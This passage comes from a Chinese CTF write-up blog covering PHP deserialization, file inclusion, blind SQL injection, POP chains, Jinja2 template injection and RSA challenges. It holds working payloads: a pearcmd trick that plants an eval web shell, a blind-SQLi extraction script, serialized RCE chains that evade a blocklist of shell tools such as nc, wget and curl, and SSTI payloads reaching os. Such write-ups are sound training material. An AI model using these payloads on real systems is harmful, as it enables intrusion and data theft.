'flag.php';\n\nerror_reporting(0);\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n\n    function __wakeup(){\n        $this->username = 'guest';\n    }\n\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n\n            \n        }\n    }\n}\n?>\n```\n\nå¾—åˆ°\n\n```php\nO:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\n```\n\nç»•è¿‡__wakeup\n\n```php\nO:4:\"Name\":3:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\n```\n\nprivateå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆ%00ç±»å%00å±æ€§å,æ ¹æ®è§„åˆ™è¿›è¡Œä¿®æ”¹\n\n```php\nO:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n```\n\nç„¶å?selectä¼ å€¼\n\n```php\n?select=O:4:\"Name\":3{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n```\n\n`https://blog.csdn.net/weixin_45785288/article/details/109877324`\n","tags":["åºåˆ—åŒ–","ååºåˆ—åŒ–","php"],"categories":["PHP"]},{"title":"NewStar2023 Week3","url":"/NewStar2023-WriteUp-Week3/","content":"\n## week3\n\n### web\n\n#### Include ğŸ\n\né¢˜ç›®ï¼š\n\n```php\n <?php\n    error_reporting(0);\n    if(isset($_GET['file'])) {\n        $file = $_GET['file'];\n        \n        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {\n            die('hacker!');\n        }\n        \n        include($file.\".php\");\n        # Something in phpinfo.php!\n    }\n    else {\n        highlight_file(__FILE__);\n    }\n?> \n```\n\næ ¹æ®æç¤ºæ‰“å¼€`phpinfo.php` => `?file=phpinfo`, æœç´¢flag\n\n![image-20231024100040895](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024100040895.png)\n\næ ¹æ®æç¤ºæœç´¢`register_argc_argv`, å‘ç°ä¸ºOn\n\n![image-20231024100618137](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024100618137.png)\n\nç»“åˆé¢˜ç›®æç¤ºğŸï¼Œåº”è¯¥æ˜¯åˆ©ç”¨pearcmdæ–‡ä»¶åŒ…å«\n\næ„é€ **payload**\n\n`?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST[0]);?>+/tmp/cmd.php`\n\n![image-20231024102307424](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024102307424.png)\n\nè¿›è¡Œ`POST`æŸ¥çœ‹flag\n\n```php\n?file=/tmp/cmd\n#POST\n0 = system(\"cat /flag\");\n```\n\n![image-20231024102854987](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231024102854987.png)\n\nå‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/RABCDXB/article/details/122050370\n\n#### medium_sql\n\næµ‹è¯•åˆ¤æ–­æ˜¯å¦å­˜åœ¨å¸ƒå°”ç›²æ³¨ **# è¦ç¼–ç ä¸º%23**\n\n```sql\n?id=TMP0919'And if(1>0,1,0)%23\n?id=TMP0919'And if(0>1,1,0)%23\n```\n\nå‰è€…å¯ä»¥è¿”å›æ­£å¸¸çš„ä¿¡æ¯`id: TMP0919`ï¼Œåè€…ä¼šè¿”å›`id not exists`  \n\næ³¨æ„ç”¨å¤§å°å†™ç»•è¿‡è¢«è¿‡æ»¤çš„å­—ç¬¦\n\n```python\nimport time\nimport requests\n\n\ndef db_length(str, url):\n    print(\"[-] æµ‹è¯•æ•°æ®åº“é•¿åº¦.......\")\n    num = 1\n    while True:\n        payload = url + f\"'%20And%20lengTh(daTabase())={num}%23\"\n        # print(payload)\n        r = requests.get(url=payload)\n        time.sleep(0.1)\n        # print(r.text)\n        if str in r.text:\n            db_length = num\n            print(f\"[+] æ•°æ®åº“é•¿åº¦ï¼š{db_length}\")\n            db_name(db_length)\n            break\n        else:\n            num += 1\n\n\ndef db_name(db_length):\n    print(\"[-] æµ‹è¯•æ•°æ®åº“å.......\")\n    strascii = \"qwertyuioplkjhgfdsazxcvbnm1234567890\"\n    tmp = \"\"\n    for i in range(1, db_length + 1):\n        for j in strascii:\n            payload = url + f\"'%20And%20Substr(dAtabase(),{i},1)='{j}'%23\"\n            # print(payload)\n            time.sleep(0.1)\n            r = requests.get(url=payload)\n            if str in r.text:\n                tmp += j\n                print(tmp)\n    print(f\"[+] æ•°æ®åº“åï¼š{tmp}\")\n    table_name()\n\n\ndef table_name():\n    print(\"[-] æµ‹è¯•æ•°æ®åº“ è¡¨å.......\")\n    strascii = \"abcdefghijklmnopqrstuvwxyz1234567890_, \"\n    tmp = \"\"\n    for i in range(25):  # å‡å®šè¡¨çš„é•¿åº¦ä¸º25\n        for j in strascii:\n            payload = url + f\"'%20And%20Substr((Select%20Group_Concat(table_name)%20fRom%20infoRmation_schema.tables%20wHere%20tAble_schema=dAtabase()),{i},1)='{j}'%23\"\n            time.sleep(0.1)\n            r = requests.get(url=payload)\n            if str in r.text:\n                tmp += j\n                # print(tmp)\n    print(f\"[+] æ•°æ®åº“ è¡¨åï¼š{tmp}\")\n    table_columns()\n\n\ndef table_columns():  # æ­¤å‡½æ•°æ˜¯åœ¨æµ‹è¯•å¤„æ•°æ®åº“è¡¨ååæ‰å†™å‡ºï¼Œå› è€ŒçŸ¥é“è¡¨åâ€œgrades,here_is_flagâ€\n    print(\"[-] æµ‹è¯•æ•°æ®åº“è¡¨ä¸­åˆ—åä¿¡æ¯.......\")\n    strascii = \"abcdefghijklmnopqrstuvwxyz1234567890_, \"\n    tmp = \"\"\n    for i in range(10):  # å‡å®šåˆ—åé•¿åº¦ä¸º10\n        for j in strascii:\n            payload = url + f\"'%20And%20Substr((Select%20Group_Concat(column_name)%20fRom%20infoRmation_schema.columns%20wHere%20tAble_name='here_is_flag'),{i},1)='{j}'%23\"\n            time.sleep(0.1)\n            r = requests.get(url=payload)\n            if str in r.text:\n                tmp += j\n                print(tmp)\n    print(f\"[+] æ•°æ®åº“è¡¨ä¸­åˆ—åä¿¡æ¯ï¼š{tmp}\")\n    information_flag()\n\n\ndef information_flag():\n    print(\"[-] æµ‹è¯•æ•°æ®åº“è¡¨ä¸­æ•°æ®.......\")\n    strascii = \"abcdefghijklmnopqrstuvwxyz1234567890_, {}\"\n    tmp = \"\"\n    for i in range(50):  \n        for j in strascii:\n            payload = url + f\"'%20And%20Substr((Select%20flag%20fRom%20here_is_flag),{i},1)='{j}'%23\"\n            time.sleep(0.1)\n            r = requests.get(url=payload)\n            if str in r.text:\n                tmp += j\n                # print(tmp)\n    print(f\"[+] æ•°æ®åº“è¡¨ä¸­æ•°æ®ï¼š{tmp}\")\n\n\nif __name__ == '__main__':\n    url = 'http://efffc673-9bf2-42fc-ac02-9a443cbe5a85.node4.buuoj.cn:81/?id=TMP0919'\n    str = 'Physics'\n    db_length(str, url)\n\n```\n\næ³¨æ„ï¼šä¸Šè¿°è„šæœ¬æ²¡æœ‰ä½¿ç”¨ç®—æ³•ï¼Œç›´æ¥éå†è·å¾—ç›¸å…³ä¿¡æ¯ï¼Œå› è€Œè¿è¡Œæ—¶é—´è¾ƒé•¿ï¼Œå„ä½å¯ä»¥æ ¹æ®éœ€æ±‚ä¿®æ”¹ä»£ç \n\n![image-20231027122055140](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027122055140.png)\n\n#### POP Gadget\n\né¢˜ç›®ï¼š\n\n```php\n <?php\nhighlight_file(__FILE__);\n\nclass Begin{\n    public $name;\n\n    public function __destruct()\n    {\n        if(preg_match(\"/[a-zA-Z0-9]/\",$this->name)){\n            echo \"Hello\";\n        }else{\n            echo \"Welcome to NewStarCTF 2023!\";\n        }\n    }\n}\n\nclass Then{\n    private $func;\n\n    public function __toString()\n    {\n        ($this->func)();\n        return \"Good Job!\";\n    }\n\n}\n\nclass Handle{\n    protected $obj;\n\n    public function __call($func, $vars)\n    {\n        $this->obj->end();\n    }\n\n}\n\nclass Super{\n    protected $obj;\n    public function __invoke()\n    {\n        $this->obj->getStr();\n    }\n\n    public function end()\n    {\n        die(\"==GAME OVER==\");\n    }\n}\n\nclass CTF{\n    public $handle;\n\n    public function end()\n    {\n        unset($this->handle->log);\n    }\n\n}\n\nclass WhiteGod{\n    public $func;\n    public $var;\n\n    public function __unset($var)\n    {\n        ($this->func)($this->var);    \n    }\n}\n\n@unserialize($_POST['pop']); \n```\n\n>//ç›®çš„æ˜¯è§¦å‘readfile(\"/flag\")å‡½æ•°\n>\n>//éœ€è¦è§¦å‘WihteGod->__unset()æ–¹æ³• å°±å¿…é¡»é€šè¿‡unset(WihteGod()) \n>\n>//éœ€è¦unset(WihteGod()) å°±å¿…é¡»é€šè¿‡CTF->end()\n>\n>//éœ€è¦CTF->end() å°±å¿…é¡»é€šè¿‡Handle->__call()\n>\n>//éœ€è¦Handle->__call() å°±å¿…é¡»é€šè¿‡Handle->[ä¸å­˜åœ¨çš„å‡½æ•°]() ä¹Ÿå°±æ˜¯Handle->getStr()   **â€”callæ˜¯é­”æœ¯æ–¹æ³•çš„ä¸€ä¸ªï¼Œå½“ç¨‹åºè°ƒç”¨åˆ°å½“å‰ç±»ä¸­æœªå£°æ˜æˆ–æ²¡æƒé™è°ƒç”¨çš„æ–¹æ³•æ—¶ï¼Œå°±ä¼šè°ƒç”¨â€”callæ–¹æ³•**\n>\n>//éœ€è¦Handle->getStr() å°±å¿…é¡»é€šè¿‡Super->__invoke() \n>\n>//éœ€è¦Super->__invoke() å°±å¿…é¡»é€šè¿‡(Super)()è¢«å½“åšå‡½æ•°è°ƒç”¨**â€”invoke()ï¼šå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œâ€”invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚**\n>\n>//éœ€è¦(Super)() å°±å¿…é¡»é€šè¿‡Then->__toString()\n>\n>//éœ€è¦Then->__toString() å°±å¿…é¡»Thenè¢«å½“åšå­—ç¬¦ä¸²\n>\n>//éœ€è¦Thenè¢«å½“åšå­—ç¬¦ä¸² å°±å¿…é¡»é€šè¿‡Begin->__destruct()\n\nç”±é¢˜ç›®å¾—çŸ¥ï¼Œæˆ‘ä»¬æœ€ç»ˆæ˜¯è¦æƒ³åŠæ³•è§¦å‘`WhiteGod->__unset()æ–¹æ³•`ï¼Œè¿™æ ·å°±èƒ½å¤Ÿé€šè¿‡æ„é€ **WhiteGod(func,cmd)**ç±»ï¼Œä¼ å…¥éœ€è¦æ‰§è¡Œçš„å‡½æ•°å’Œå‘½ä»¤ï¼ˆä¾‹å¦‚`system(\"ls\")`ï¼‰ã€‚\n\nè¦è§¦å‘`WhiteGod->__unset()æ–¹æ³•`ï¼Œå°±å¿…é¡»æœ‰ä¸€ä¸ª`unset(WhiteGod->ä¸å­˜åœ¨)`ï¼Œä¹Ÿå°±æ˜¯**CTF(WhiteGod(func,cmd))**ï¼Œå¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘`CTF->end()`ã€‚\n\nè¦è§¦å‘`CTF->end()`æ–¹æ³•ï¼Œå°±åªèƒ½é€šè¿‡`Handle(CTF)`ï¼Œä¹Ÿå°±æ˜¯**Handle(CTF(WhiteGod(func,cmd)))**ã€‚å¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘`Handle->__call()`ã€‚\n\nè¦è§¦å‘`Handle->__call()`æ–¹æ³•ï¼Œå°±éœ€è¦å‡ºç°`Handle->ä¸å­˜åœ¨`ï¼Œå³`Handle->ä¸å­˜åœ¨getStr()`ï¼Œä¹Ÿå°±æ˜¯**Super(Handle(CTF(WhiteGod(func,cmd))))**ï¼Œå¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘`Super->__invoke()`ã€‚\n\nè¦è§¦å‘`Super->__invoke()æ–¹æ³•`ï¼Œå°±éœ€è¦å‡ºç°`(Super)();`å³Superè¢«å½“åšå‡½æ•°åè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯**Then(Super(Handle(CTF(WhiteGod(func,cmd)))))**ï¼Œå¹¶ä¸”è¦æƒ³åŠæ³•è§¦å‘`Then->__toString()æ–¹æ³•`ã€‚\n\nè¦è§¦å‘`Then->__toString()æ–¹æ³•`ï¼Œå°±éœ€è¦`Thenè¢«å½“åšå­—ç¬¦ä¸²å¤„ç†`ï¼Œå³`Begin()->__destruct()`ä¸­çš„æ­£åˆ™ã€‚ä¹Ÿå°±æ˜¯**Begin(Then(Super(Handle(CTF(WhiteGod(func,cmd)))))**\n\nè¿™æ ·ï¼Œå®Œæ•´çš„POPé“¾å°±æ„é€ å‡ºæ¥äº†\n\n****\n\n**ç¼–å†™Exp**\n\n```php\n<?php\n\nuse Begin as GlobalBegin;\nuse Then as GlobalThen;\n\nclass Begin{\n    public $name;\n\n    public function __construct($a)\n    {\n        $this->name = $a;\n    }\n\n}\n\nclass Then{\n    private $func;\n\n    public function __construct($a)\n    {\n        $this->func = $a;\n    }\n\n}\n\nclass Handle{\n    protected $obj;\n\n    public function __construct($a)\n    {\n        $this->obj = $a;\n    }\n\n}\n\nclass Super{\n    protected $obj;\n    public function __construct($a)\n    {\n        $this->obj = $a;\n    }\n\n}\n\nclass CTF{\n    public $handle;\n\n    public function __construct($a)\n    {\n        $this->handle = $a;\n    }\n\n}\n\nclass WhiteGod{\n    public $func;\n    public $var;\n\n    public function __construct($a, $b)\n    {\n        $this->func = $a;\n        $this->var = $b;\n    }\n}\n\n$obj = new Begin(new Then(new Super(new Handle(new CTF(new WhiteGod(\"readfile\",\"/flag\"))))) );\necho urlencode(serialize($obj));\n\n?>\n```\n\n![image-20231025201417567](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025201417567.png)\n\n\n\n#### R!!!C!!!E!!!\n\né¢˜ç›®ï¼š\n\n```php\n <?php\nhighlight_file(__FILE__);\nclass minipop{\n    public $code;\n    public $qwejaskdjnlka;\n    public function __toString()\n    {\n        if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){\n            exec($this->code);\n        }\n        return \"alright\";\n    }\n    public function __destruct()\n    {\n        echo $this->qwejaskdjnlka;\n    }\n}\nif(isset($_POST['payload'])){\n    //wanna try?\n    unserialize($_POST['payload']);\n} \n```\n\nè§‚å¯Ÿæºç ï¼Œå…¸å‹çš„phpåºåˆ—åŒ–ï¼Œè§‚å¯Ÿé¢˜ç›®ï¼Œè¿™åˆæ˜¯ä¸€é“rceçš„é¢˜ç›®ï¼Œåº”è¯¥å¯ä»¥é€šè¿‡teeå‘½ä»¤->**æŠŠæ‰§è¡Œçš„å‘½ä»¤å†™å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®è¿™ä¸ªæ–‡ä»¶æ¥çœ‹åˆ°å›æ˜¾å†…å®¹**\n\n```php\n<?php\nclass minipop{\n    public $code=\"ls / | t''ee a\";\n    public $qwejaskdjnlka;\n}\n$a = new minipop();\n$b = new minipop();\n$b->qwejaskdjnlka = $a;\necho urlencode(serialize($b));\n\n?>\n```\n\n`O%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BO%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BN%3B%7D%7D`æ³¨æ„å°†+ æ¢æˆ%20\n\næ¥ç€è®¿é—®`url/a`\n\n![image-20231027144154458](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027144154458.png)\n\nå‘ç°flagçš„è—èº«ä¹‹åœ°\n\n```php\n<?php\nclass minipop{\n    public $code=\"cat /flag_is_h3eeere | t''ee b\";\n    public $qwejaskdjnlka;\n}\n$a = new minipop();\n$b = new minipop();\n$b->qwejaskdjnlka = $a;\necho urlencode(serialize($b));\n\n?>\n```\n\nè®¿é—®url/b å‡ºç°flag\n\n![image-20231027144414800](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027144414800.png)\n\n\n\n#### GenShin\n\næŠ“åŒ…å‘ç°ï¼š/secr3tofpop\n\n![image-20231027145206974](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145206974.png)\n\næ‰“å¼€å‘ç° éœ€è¦é€šè¿‡getç»™nameä¼ å‚\n\n![image-20231027145301252](http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145301252.png)\n\nå‘ç°ç»™nameä¼ ä»€ä¹ˆï¼Œé¡µé¢å°±å›æ˜¾ä»€ä¹ˆï¼Œé¦–å…ˆå°è¯•äº†phpä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œæµ‹è¯•å¤±è´¥ï¼Œåœ¨æŸ¥è¯¢èµ„æ–™åå‘ç°ä¸`UNCTF2020`çš„easyflaské¢˜ç›®å¾ˆç›¸ä¼¼ï¼ŒçŒœæµ‹æ˜¯æ¨¡ç‰ˆæ³¨å…¥ï¼Œé¦–å…ˆå°è¯•{% raw %}{{%print(7*7)%}}{% endraw %}\n\nå‘ç°åº”è¯¥æ˜¯ {% raw %}{{{% endraw %}è¢«è¿‡æ»¤,äºæ˜¯æˆ‘ä»¬å°è¯•{% raw %}{%print(7*7)%}->{%%}{% endraw %}é‡Œé¢å¯ä»¥æ‰§è¡Œpythonå‘½ä»¤\n\n![image-20231027145716110](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145716110.png)\n\nå‡ºç°äº†è®¡ç®—çš„ç»“æœï¼Œäºæ˜¯æ‰“å¼€configé…ç½®->{% raw %}**{%print(config)%}** {% endraw %}æ²¡æœ‰å‘ç°æœ‰ç”¨ä¿¡æ¯\n\n![image-20231027150211931](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027150211931.png)\n\næ¥ç€çŒœæµ‹æ˜¯jinja2æ¨¡æ¿æ³¨å…¥ï¼Œæ‰€ä»¥æ˜¯__ class __ æ‰¾çˆ¶ç±»ï¼Œç„¶å __  base __ ç»§ç»­æ¢­ï¼Œç„¶å__ subclasses __æ‹¿åˆ°æ‰€æœ‰ç±»\n\n![image-20231027151116330](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027151116330.png)\n\næ¥ç€å†™è„šæœ¬æ‰¾å‡ºèƒ½ç”¨çš„osç±»ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šè¿›è¡ŒRCEï¼š\n\n```python\nimport requests\nimport re\nimport time\nfor i in range(0,600):\n    url = \"http://ea05b4b0-6969-4766-a5cd-d6766af72b08.node4.buuoj.cn:81/secr3tofpop\"\n    payload = '{% print([].__class__.__base__.__subclasses__()[' + str(i) + ']) %}' #æ³¨æ„å¼•å·\n    # print(payload)\n    get_data = {\"name\": payload}\n    s = requests.get(url=url,params=get_data)\n    time.sleep(0.1)\n    if 'os' in s.text:\n        print(i)\n        print(s.text)\n\n```\n\næ¥ç€ç”¨initæ–¹æ³•\n\n```bash\n __init__:æ‰€æœ‰è‡ªå¸¦ç±»éƒ½åŒ…å«initæ–¹æ³•ã€‚æ˜¯æœåŠ¡ä¸‹é¢è¿™ä¸ªå‡½æ•°çš„\n  __globals__:\nfunction.__globals__ï¼Œç”¨äºè·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚\n```\n\nå‘ç°è¢«è¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥å­—ç¬¦ä¸²æ‹¼æ¥\n\n```python\n{%print([].__class__.__base__.__subclasses__()[95][\"__in\"+\"it__\"].__globals__[\"os\"].listdir(\".\"))%}\t\t# ä¸èƒ½æˆåŠŸæ˜¾ç¤º\n{%print([].__class__.__base__.__subclasses__()[96][\"__in\"+\"it__\"].__globals__[\"os\"].listdir(\".\"))%}\t\t# ä¸èƒ½æˆåŠŸæ˜¾ç¤º\n{%print([].__class__.__base__.__subclasses__()[132][\"__in\"+\"it__\"].__globals__[\"os\"].listdir(\".\"))%}\t # ä¸èƒ½æˆåŠŸæ˜¾ç¤º\n{%print([].__class__.__base__.__subclasses__()[309][\"__in\"+\"it__\"].__globals__[\"os\"].listdir(\".\"))%}     # èƒ½æˆåŠŸæ˜¾ç¤º\n```\n\n![image-20231027153849947](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027153849947.png)\n\nåˆ©ç”¨ _ _ builtins _ _ è¯»æ–‡ä»¶\n\n![image-20231027154020545](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027154020545.png)\n\n> æ¨¡ç‰ˆæ³¨å…¥ç›¸å…³çŸ¥è¯†ç‚¹å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  å†™çš„å¾ˆä¸é”™ï¼š https://blog.csdn.net/LYJ20010728/article/details/120205725?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165811033516781647533366%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165811033516781647533366&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-120205725-null-null.142%5Ev32%5Enew_blog_pos_by_title,185%5Ev2%5Econtrol&utm_term=SSTI%20%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187\n\n### crypto\n\n#### Rabin's RSA\n\né¢˜ç›®ï¼š\n\n```python\nfrom Crypto.Util.number import *\nfrom secret import flag\np = getPrime(64)\nq = getPrime(64)\nassert p % 4 == 3\nassert q % 4 == 3\n\nn = p * q\n\ne = 2\nm = bytes_to_long(flag)\n\nc = pow(m,e,n)\n\nprint('n =', n)\nprint('c =', c)\n\n# n = 201354090531918389422241515534761536573\n# c = 20442989381348880630046435751193745753\n```\n\næ ¹æ®æç¤ºï¼Œéœ€è¦ç”¨åˆ°RSA-rabinç®—æ³•\n\né¦–å…ˆè¿›è¡Œå¤§ç´ æ•°åˆ†è§£\n\n![image-20231025200757749](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025200757749.png)\n\npythonè„šæœ¬\n\n```python\nimport gmpy2\nimport libnum\n\np = 13934102561950901579\nq = 14450452739004884887\nn = 201354090531918389422241515534761536573\nc = 20442989381348880630046435751193745753\ne = 2\n\ninv_p = gmpy2.invert(p, q)\ninv_q = gmpy2.invert(q, p)\nmp = pow(c, (p + 1) // 4, p)\nmq = pow(c, (q + 1) // 4, q)\na = (inv_p * p * mq + inv_q * q * mp) % n\nb = n - int(a)\nc = (inv_p * p * mq - inv_q * q * mp) % n\nd = n - int(c)\n# å› ä¸ºrabin åŠ å¯†æœ‰å››ç§ç»“æœï¼Œå…¨éƒ¨åˆ—å‡ºã€‚\naa = [a, b, c, d]\nfor i in aa:\n    print(i)\n    print(libnum.n2s(int(i)))\n```\n\n#### å°æ˜çš„å¯†ç é¢˜\n\né¢˜ç›®ï¼š\n\n```python\nfrom Crypto.Util.number import *\nfrom secret import *\nflag_part = flag_content + '#' + secret_token\np = getPrime(512)\nq = getPrime(512)\n\nm = bytes_to_long(flag_part.encode())\n\ne = 5\nn = p*q\n\nc = pow(m,e,n)\n\nprint('n =', n)\nprint('c =', c)\nprint('flag_part =', flag_part)\nprint()\nprint('--- hint begin ---')\nprint('flag = \"flag{\" + flag_part + \"}\"')\nprint('type of secret_token is', type(secret_token))\nprint('length of secret_token is', len(secret_token))\n\n# n = 131889193322687215946601811511407251196213571687093913054335139712633125177496800529685285401802802683116451016274353008428347997732857844896393358010946452397522017632024075459908859131965234835870443110233375074265933004741459359128684375786221535003839961829770182916778717973782408036072622166388614214899\n# c = 11188201757361363141578235564807411583085091933389381887827791551369738717117549969067660372214366275040055647621817803877495473068767571465521881010707873686036336475554105314475193676388608812872218943728455841652208711802376453034141883236142677345880594246879967378770573385522326039206400578260353074379\n# flag_part = sm4ll_r00ts_is_brilliant#â—¼ï¸â—¼ï¸â—¼ï¸â—¼ï¸â—¼ï¸â—¼ï¸â—¼ï¸â—¼ï¸\n# \n# --- hint begin ---\n# flag = \"flag{\" + flag_part + \"}\"\n# type of secret_token is <class 'str'>\n# length of secret_token is 8\n\n```\n\næ ¹æ®é¢˜ç›®æç¤ºï¼Œå¯ä»¥çœ‹å‡ºæ˜¯**rsaçš„mé«˜ä½æ³„éœ²æ”»å‡»ï¼š**\n\nå°†first_part å­—èŠ‚è½¬æ¢æˆåè¿›åˆ¶\n\n```python\nfrom Crypto.Util.number import *\nhigh_m=b'sm4ll_r00ts_is_brilliant#00000000'\nprint(bytes_to_long(high_m))\n# high_m = 13365484987144638321487231038779529936591301518920854766433948366068803286609968\n```\n\nåˆ©ç”¨`sagemath`https://sagecell.sagemath.org/\n\nç¼–å†™sageä¸€æŠŠæ¢­\n\n```python\nn = 131889193322687215946601811511407251196213571687093913054335139712633125177496800529685285401802802683116451016274353008428347997732857844896393358010946452397522017632024075459908859131965234835870443110233375074265933004741459359128684375786221535003839961829770182916778717973782408036072622166388614214899\nc = 11188201757361363141578235564807411583085091933389381887827791551369738717117549969067660372214366275040055647621817803877495473068767571465521881010707873686036336475554105314475193676388608812872218943728455841652208711802376453034141883236142677345880594246879967378770573385522326039206400578260353074379\nhigh_m= 13365484987144638321487231038779529936591301518920854766433944893740507058929664\n\nR.<x> = PolynomialRing(Zmod(n), implementation='NTL')\nm = high_m + x\nM = m((m^5 - c).small_roots()[0])\nprint(M)\n\n# M = 13365484987144638321487231038779529936591301518920854766433952055361547196905266\n```\n\nè§£å¯†Mï¼šå°†åè¿›åˆ¶è½¬æ¢æˆå­—èŠ‚\n\n```python\nfrom Crypto.Util.number import *\n\nM = 13365484987144638321487231038779529936591301518920854766433952055361547196905266\nprint(long_to_bytes(M).decode('utf-8', errors='ignore'))\n# sm4ll_r00ts_is_brilliant#cc0dac72\n```\n\n#### easy_crt\n\né¢˜ç›®ï¼š\n\n```python\nfrom Crypto.Util.number import *\nfrom secret import flag, p, q\nfrom hashlib import *\nimport random\n\nassert 'flag{' + md5(str(p).encode()).hexdigest() + '}' == flag\nassert isPrime(p), isPrime(q)\nassert p.bit_length() == 1024, q.bit_length() == 1024\n\nm = random.getrandbits(400)\ne = 65537\nd = inverse(e, (p - 1) * (q - 1))\nr1, r2, r3 = getPrime(20), getPrime(20), getPrime(10)\n\ndp, dq = d % (p - 1), d % (q - 1)\nSp, Sq = pow(m + getPrime(10), dp, r1 * p), pow(m, dq, r2 * q)\ns1, s2 = pow(m, dp % (r1 - 1), r1), pow(m, dq % (r2 - 1), r2)\nS_ = Sq + (q * r2) * (int(inverse(q * r2, p * r1)) * (Sp - Sq) % (p * r1))\nc1, c2 = (S_ - s1 + 1) % r1, (S_ - s2 + 1) % r2\ngamma = (r3 * c1 + (2 ** 10 - r3) * c2) // (2 ** 10)\nS = pow(S_, gamma, p * q)\n\nprint(m)\nprint(p * q)\nprint(S_)\nprint(S)\n\n'''\nm=2180240512138982889935733758776025289492848542072999905411903898302427496814336475436552230920326681809745778470583226987\nn=25505131259827344749407187081729819350996141100990518281765117676936124636084125400315049858697199427401342785804654120926568235761577895862889807660442415521870277729420875825744007886870384790308986342360349597392841568418588521694478184632631896474390291958350681472768485356865513284619086754437723630874827593280089682939629265210875169009057935264259019861755270570945614034505771690412042781423771110441028258110022746603974882162934979726300741541857444013708508946471384525030286343828680432038605288717842755346907256658746733811881247992925881684393431852248253701825024590345480994598867741811599162649467\nS_=5510086561842250138908875342533294108331951659612671466695801343686972919443402163401521040457640602756777910081639191753436122171756174730531385913865951826869995984787102439679170684422717808771260217541439878677750508065703064081375473845405916674327932798153100574555933448570618732842365795738120491532398081467312017203933413296779070611024124965772787502242499016884537233028947865288037718074352448773759363242111080540630360902388540661831992776707600133253329779003707938065020121645530719140954554800986771763343191398210100325971573069812381693089384221441735278736889673500218274673196333806222266248844379127652366\nS=11422623501509574650959962952004985925543723972567988534433510888436662069119800576321679344425052011563473005275801787271861671898318523033415642388512047035650991047953319601346912194462122313366888126100093635969476696871403883687946617575837061694813669883782221006701704487938500886952347003631626326127154081787016692856628561200386941683756397734100698520464199249811238013146899352390453500132666840606585760306723894654933077094375810666168464835756607377998959675132305971721109661644231613426322675350973373434138686086023265910883509514575554429502214217460059521619625693750938117427832654792355808803321\n'''\n\n```\n\nå‚è€ƒæ–‡çŒ®ï¼šhttps://www.infocomm-journal.com/cjnis/article/2019/2096-109x/2096-109x-5-1-00030.shtml\n\n![image-20231027170037956](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027170037956.png)\n\nç¼–å†™exp:\n\n```python\nfrom Crypto.Util.number import *\nfrom hashlib 